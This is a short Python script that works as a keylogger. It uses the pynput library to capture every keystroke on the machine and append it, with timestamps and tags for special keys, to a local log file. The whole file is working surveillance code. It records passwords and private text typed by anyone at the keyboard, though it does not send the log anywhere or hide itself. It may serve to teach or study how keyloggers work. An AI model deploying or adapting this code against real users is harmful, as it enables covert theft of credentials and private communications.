from pynput import keyboard
from datetime import datetime

LOG_FILE = "logFile.txt"

with open(LOG_FILE, 'a') as logKey:
    start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    logKey.write(f"\n{'-' * 50}\nKeylogger Started at {start_time}\n{'-' * 50}\n\n")

def keyPressed(key):
    # This function record and write it to the log file each pressed event

    try:
        # Opening file in append mode, avoiding overwriting
        with open(LOG_FILE, 'a') as logKey:

            try:
                logKey.write(key.char)
            except AttributeError:
                if key == keyboard.Key.space:
                    logKey.write(' ')
                elif key == keyboard.Key.enter:
                    logKey.write('\n')
                elif key == keyboard.Key.backspace:
                    logKey.write('[BACKSPACE]')
                elif key == keyboard.Key.shift:
                    logKey.write('[SHIFT]')
                elif key == keyboard.Key.esc:
                    logKey.write('[ESC]')
                else:
                    logKey.write(f'[{key.name.upper()}]')

    except IOError:
        print("Error: Log file could not be opened or written.")

if __name__ == "__main__":
    try:
        listener = keyboard.Listener(on_press=keyPressed)
        listener.start()
        while listener.running:
            pass  # Keep running until manually interrupted
    except KeyboardInterrupt:
        pass
    finally:
        with open(LOG_FILE, 'a') as logKey:
            stop_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            logKey.write(f"\n{'-' * 50}\nKeylogger Stopped at {stop_time}\n{'-' * 50}\n")
